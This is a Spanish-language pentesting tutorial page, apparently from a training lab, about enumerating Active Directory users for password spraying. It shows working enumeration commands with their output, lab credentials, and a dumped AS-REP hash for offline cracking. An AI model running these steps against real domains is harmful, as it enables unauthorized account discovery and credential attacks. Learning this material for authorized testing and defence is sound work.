
# AD: Crear lista de usuarios

## <mark style="color:purple;">Enumeración detallada de usuarios</mark>

Para montar un ataque de pulverización de contraseñas exitoso, primero necesitamos una lista de usuarios de dominio válidos con los que intentar autenticarnos. Hay varias formas de recopilar una lista objetivo de usuarios válidos:

* Aprovechando una `sesión SMB NULL` para recuperar una lista completa de usuarios del dominio desde el controlador de dominio
* Utilizar un enlace anónimo de LDAP para consultar LDAP de forma anónima y desplegar la lista de usuarios del dominio
* Usar una herramienta como `Kerbrute` para validar a los usuarios utilizando una lista de palabras de una fuente como el repositorio de GitHub de [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)  , o recopiladas mediante el uso de una herramienta como [linkedin2username](https://github.com/initstring/linkedin2username) para crear una lista de usuarios potencialmente válidos.
* Utilizando un conjunto de credenciales de un sistema de ataque Linux o Windows proporcionado por nuestro cliente u obtenido a través de otros medios, como el envenenamiento de respuesta LLMNR/NBT-NS con `Responder` o incluso una pulverización de contraseñas exitosa utilizando una lista de palabras más pequeña

No importa el método que elijamos, también es vital que tengamos en cuenta la política de contraseñas del dominio. Si tenemos una sesión SMB NULL, un enlace anónimo LDAP o un conjunto de credenciales válidas, podemos enumerar la política de contraseñas. Tener esta política a mano es muy útil porque la longitud mínima de la contraseña y si la complejidad de la contraseña está habilitada o no pueden ayudarnos a formular la lista de contraseñas que probaremos en nuestros intentos de pulverización. Conocer el umbral de bloqueo de cuenta y el temporizador de contraseña incorrecta nos dirá cuántos intentos de pulverización podemos realizar a la vez sin bloquear ninguna cuenta y cuántos minutos debemos esperar entre intentos de pulverización.

Nuevamente, si no conocemos la política de contraseñas, siempre podemos preguntarle a nuestro cliente y, si no nos la proporciona, podemos intentar un password spraying muy específico como si fuera un "Ave María", si se han agotado todas las demás opciones para establecer un punto de apoyo. También podríamos intentar un rociado cada pocas horas en un intento de no bloquear ninguna cuenta. Independientemente del método que elijamos, y si tenemos la política de contraseñas o no, siempre debemos mantener un registro de nuestras actividades, incluyendo, pero no limitado a:

* `Las cuentas objetivo`
* `Controlador de dominio utilizado en el ataque`
* `Hora del spray`
* `Fecha del spray`
* `Contraseña(s) intentada(s)`

Esto nos ayudará a asegurarnos de no duplicar esfuerzos. Si se produce un bloqueo de cuenta o nuestro cliente nota intentos de inicio de sesión sospechosos, podemos proporcionarles nuestras notas para verificarlas con sus sistemas de registro y asegurarnos de que no esté sucediendo nada nefasto en la red.

***

## <mark style="color:purple;">Sesión SMB NULL para extraer la lista de usuarios</mark>

Si está en una máquina interna pero no tiene credenciales de dominio válidas, puede buscar sesiones SMB NULL o enlaces anónimos LDAP en controladores de dominio. Cualquiera de estos le permitirá obtener una lista precisa de todos los usuarios dentro de Active Directory y la política de contraseñas. Si ya tiene credenciales para un usuario de dominio o acceso `SYSTEM` en un host de Windows, puede consultar fácilmente esta información en Active Directory.

Es posible hacer esto usando la cuenta `SYSTEM` porque puede `impersonar` el equipo. Un objeto de computadora se trata como una cuenta de usuario de dominio (con algunas diferencias, como la autenticación entre confianzas de bosque). Si no tiene una cuenta de dominio válida y las sesiones SMB NULL y los enlaces anónimos LDAP no son posibles, puede crear una lista de usuarios utilizando recursos externos como la recopilación de correo electrónico y LinkedIn. Esta lista de usuarios no será tan completa, pero puede ser suficiente para brindarle acceso a Active Directory.

Algunas herramientas que pueden aprovechar las sesiones SMB NULL y los enlaces anónimos LDAP incluyen [enum4linux](https://github.com/portcullislabs/enum4linux) , [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) y [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) , entre otras. Independientemente de la herramienta, tendremos que filtrar un poco para limpiar el resultado y obtener una lista de nombres de usuario únicos, uno en cada línea. Podemos hacer esto con `enum4linux` y la opción `-U`.

### **Usando enum4linux**

```shell-session
afsh4ck@kali$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```

### **Usando rpcclient**

Podemos usar el comando `enumdomusers` después de conectarnos de forma anónima usando `rpcclient`.

```shell-session
afsh4ck@kali$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```

### **Usando CrackMapExec --users**

Finalmente, podemos usar `CrackMapExec` con la opción `--users`. Esta es una herramienta útil que también mostrará `badpwdcount`(intentos de inicio de sesión no válidos), para que podamos eliminar cualquier cuenta de nuestra lista que esté cerca del umbral de bloqueo. También muestra el `baddpwdtime`, que es la fecha y hora del último intento de contraseña incorrecta, para que podamos ver qué tan cerca está una cuenta de restablecerse `badpwdcount`. En un entorno con varios controladores de dominio, este valor se mantiene por separado en cada uno de ellos. Para obtener un total preciso de los intentos de contraseña incorrecta de la cuenta, tendríamos que consultar cada controlador de dominio y usar la suma de los valores o consultar el controlador de dominio con la función FSMO del emulador de PDC.

```shell-session
afsh4ck@kali$ crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613

<SNIP>
```

***

## <mark style="color:purple;">Reunir usuarios con LDAP anónimo</mark>

Podemos utilizar varias herramientas para reunir usuarios cuando encontramos un enlace anónimo LDAP. Algunos ejemplos incluyen [windapsearch](https://github.com/ropnop/windapsearch) y [ldapsearch](https://linux.die.net/man/1/ldapsearch) . Si elegimos utilizarlo, `ldapsearch` necesitaremos especificar un filtro de búsqueda LDAP válido. Podemos conocer más técnicas de LDAP en el módulo [LDAP de Active Directory](/ethical-hacking-cheatsheet/active-directory/active-directory/ldap.md) .

### **Usando ldapsearch**

```shell-session
afsh4ck@kali$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>
```

Herramientas como `windapsearch` estas facilitan esto (aunque aún debemos entender cómo crear nuestros propios filtros de búsqueda LDAP). Aquí podemos especificar el acceso anónimo proporcionando un nombre de usuario en blanco con la flag `-u` y la flag `-U` para indicarle a la herramienta que recupere solo los usuarios.

### **Usando** windapsearch

```shell-session
afsh4ck@kali$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

cn: Fae Anthony
userPrincipalName: fanthony@inlanefreight.local

cn: Walter Dillard
userPrincipalName: wdillard@inlanefreight.local

<SNIP>
```

***

## <mark style="color:purple;">Kerbrute: Enumerar usuarios</mark>

Como se menciona en la sección [`Enumeración inicial del dominio`](/ethical-hacking-cheatsheet/active-directory/active-directory/enumeracion-en-ad/ad-enumeracion-inicial-del-dominio.md), si no tenemos ningún acceso desde nuestra posición en la red interna, podemos usar `Kerbrute` para enumerar cuentas AD válidas para la pulverización de contraseñas.

Esta herramienta utiliza [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), que es una forma mucho más rápida y potencialmente más sigilosa de realizar la pulverización de contraseñas. Este método no genera el evento de Windows ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) o una falla de inicio de sesión que a menudo se monitorea. La herramienta envía solicitudes TGT al controlador de dominio sin autenticación previa Kerberos para realizar la enumeración de nombres de usuarios. Si el KDC responde con el error `PRINCIPAL UNKNOWN`, el nombre de usuario no es válido. Siempre que el KDC solicite la autenticación previa de Kerberos, esto indica que el nombre de usuario existe y la herramienta lo marcará como válido.&#x20;

Este método de enumeración de nombres de usuarios no provoca errores de inicio de sesión y no bloqueará cuentas. Sin embargo, una vez que tengamos una lista de usuarios válidos y cambiemos de marcha para usar esta herramienta para la pulverización de contraseñas, los intentos fallidos de autenticación previa de Kerberos contarán para las cuentas de inicio de sesión fallidas de una cuenta y pueden provocar el bloqueo de la cuenta, por lo que aún debemos tener cuidado independientemente de el método elegido.

Probemos este método usando la lista de palabras [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) de `48,705` posibles nombres de usuario comunes en el formato `flast`. El repositorio de GitHub [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) es un recurso excelente para este tipo de ataque y contiene una variedad de listas de nombres de usuarios diferentes que podemos usar para enumerar nombres de usuario válidos usando `Kerbrute`.

### **Enumeración de usuarios de Kerbrute**

```shell-session
afsh4ck@kali$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

<SNIP>
```

Revisamos más de `48.000` nombres de usuario en poco más de `12 segundos` y descubrimos más de `50 válidos`. El uso de Kerbrute para la enumeración de nombres de usuarios generará el ID de evento [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). Esto solo se activará si [el registro de eventos de Kerberos](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) está habilitado a través de la Política de grupo. Los defensores pueden ajustar sus herramientas SIEM para buscar una afluencia de este ID de evento, lo que puede indicar un ataque. Si tenemos éxito con este método durante una prueba de penetración, esta puede ser una excelente recomendación para agregar a nuestro informe.

Si no podemos crear una lista de nombres de usuario válida utilizando cualquiera de los métodos destacados anteriormente, podríamos volver a la recopilación de información externa y buscar direcciones de correo electrónico de la empresa o utilizar una herramienta como [linkedin2username](https://github.com/initstring/linkedin2username) para combinar posibles nombres de usuario de la página de LinkedIn de una empresa.

***

## <mark style="color:purple;">Enumeración con credenciales para construir nuestra lista de usuarios</mark>

Con credenciales válidas, podemos utilizar cualquiera de las herramientas mencionadas anteriormente para crear una lista de usuarios. Una forma rápida y sencilla es utilizar CrackMapExec.

### **Usando CrackMapExec con credenciales válidas**

```shell-session
afsh4ck@kali$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

[sudo] password for htb-student: 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58

<SNIP>
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.148.55 (ACADEMY-EA-ATTACK01)
Usuario " htb-student "
Contraseña " HTB_@cademy_stdnt! "
```

Enumere nombres de usuario válidos mediante Kerbrute y la lista de palabras ubicada en `/opt/jsmith.txt` en el host `ATTACK01`. ¿Cuántos nombres de usuario válidos podemos enumerar con solo esta lista de palabras desde un punto de vista no autenticado?

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 06/27/24 - Ronnie Flathers @ropnop

2024/06/27 09:08:38 >  Using KDC(s):
2024/06/27 09:08:38 >  	172.16.5.5:88

2024/06/27 09:08:38 >  [+] VALID USERNAME:	jjones@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	sbrown@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	tjohnson@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	jwilson@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	bdavis@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	njohnson@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	asanchez@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	dlewis@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	ccruz@inlanefreight.local
2024/06/27 09:08:38 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:28ed96f0d0146b19883784e8b2e2ee39$4991ea06fce6969d4eb03cb3beb2fb3d775a83f1c2bb91c5679b49230be613d4197793ab1bd83212800cee2e86e62a8b25143e080c08a69f125db4ccc5ff840d61ff269fcda6028453b963348606fd96c619e34d7c21928cd207fb05b5e31d3491f348f69bcecb300aae328c4968378e84e6d9573d6e20dc003da4d0c766b1fef91f2835d2aec179205784eeb7d75db53f2831e317538d8eb38c3be1ec1c2782b77e6a307fa34c32cce300ad648bb653f52bea330ffadbd6590890f1fc5e22b85ed08e7341a79d35e72ad85fee799945d75d3c405d3d3a6dec0f8b0c76cf20b16943f71f6ccf462da98d44ccbd3cc600db18b382a34f84617503473b7cb025e0010baa52a1ce70c1fecb
2024/06/27 09:08:38 >  [+] VALID USERNAME:	mmorgan@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	rramirez@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	jwallace@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	jsantiago@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	gdavis@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	mrichardson@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	mharrison@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	tgarcia@inlanefreight.local
2024/06/27 09:08:38 >  [+] VALID USERNAME:	jmay@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	jmontgomery@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	jhopkins@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	dpayne@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	mhicks@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	adunn@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	lmatthews@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	avazquez@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	mlowe@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	jmcdaniel@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	csteele@inlanefreight.local
2024/06/27 09:08:39 >  [+] VALID USERNAME:	mmullins@inlanefreight.local
2024/06/27 09:08:40 >  [+] VALID USERNAME:	mochoa@inlanefreight.local
2024/06/27 09:08:40 >  [+] VALID USERNAME:	aslater@inlanefreight.local
2024/06/27 09:08:40 >  [+] VALID USERNAME:	ehoffman@inlanefreight.local
2024/06/27 09:08:40 >  [+] VALID USERNAME:	ehamilton@inlanefreight.local
2024/06/27 09:08:40 >  [+] VALID USERNAME:	cpennington@inlanefreight.local
2024/06/27 09:08:41 >  [+] VALID USERNAME:	srosario@inlanefreight.local
2024/06/27 09:08:41 >  [+] VALID USERNAME:	lbradford@inlanefreight.local
2024/06/27 09:08:41 >  [+] VALID USERNAME:	halvarez@inlanefreight.local
2024/06/27 09:08:41 >  [+] VALID USERNAME:	gmccarthy@inlanefreight.local
2024/06/27 09:08:41 >  [+] VALID USERNAME:	dbranch@inlanefreight.local
2024/06/27 09:08:41 >  [+] VALID USERNAME:	mshoemaker@inlanefreight.local
2024/06/27 09:08:42 >  [+] VALID USERNAME:	mholliday@inlanefreight.local
2024/06/27 09:08:42 >  [+] VALID USERNAME:	ngriffith@inlanefreight.local
2024/06/27 09:08:42 >  [+] VALID USERNAME:	sinman@inlanefreight.local
2024/06/27 09:08:42 >  [+] VALID USERNAME:	minman@inlanefreight.local
2024/06/27 09:08:42 >  [+] VALID USERNAME:	rhester@inlanefreight.local
2024/06/27 09:08:42 >  [+] VALID USERNAME:	rburrows@inlanefreight.local
2024/06/27 09:08:43 >  [+] VALID USERNAME:	dpalacios@inlanefreight.local
2024/06/27 09:08:44 >  [+] VALID USERNAME:	strent@inlanefreight.local
2024/06/27 09:08:44 >  [+] VALID USERNAME:	fanthony@inlanefreight.local
2024/06/27 09:08:44 >  [+] VALID USERNAME:	evalentin@inlanefreight.local
2024/06/27 09:08:44 >  [+] VALID USERNAME:	sgage@inlanefreight.local
2024/06/27 09:08:45 >  [+] VALID USERNAME:	jshay@inlanefreight.local
2024/06/27 09:08:46 >  [+] VALID USERNAME:	jhermann@inlanefreight.local
2024/06/27 09:08:46 >  [+] VALID USERNAME:	whouse@inlanefreight.local
2024/06/27 09:08:46 >  [+] VALID USERNAME:	emercer@inlanefreight.local
2024/06/27 09:08:47 >  [+] VALID USERNAME:	wshepherd@inlanefreight.local
2024/06/27 09:08:49 >  Done! Tested 48705 usernames (56 valid) in 11.027 seconds
```

Encontramos `56 usuarios` válidos! 🤯

***

## <mark style="color:purple;">Ahora vamos a divertirnos</mark>

Ahora que hemos cubierto la creación de una lista de usuarios objetivo para la pulverización y discutido las políticas de contraseñas, ensuciémonos las manos realizando ataques de pulverización de contraseñas de varias maneras desde un host de ataque de Linux y luego desde un host de Windows.
